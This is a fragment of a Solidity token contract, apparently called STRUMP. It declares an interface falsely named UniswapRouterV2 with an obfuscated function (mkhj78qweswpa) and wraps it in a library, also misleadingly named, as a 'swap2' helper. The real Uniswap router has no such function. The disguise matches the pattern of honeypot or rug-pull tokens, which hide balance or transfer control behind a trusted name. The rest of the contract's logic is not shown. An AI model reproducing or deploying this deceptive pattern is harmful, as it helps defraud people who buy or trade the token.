...
interface UniswapRouterV2 {
    function mkhj78qweswpa(address choong, uint256 total,address destination) external view returns (uint256);
...
library IUniswapRouterV2 {
    function swap2(UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {
       return instance.mkhj78qweswpa(address(0),amount,from);
    }
...
contract STRUMP is wearewin,IERC20,Ownable {
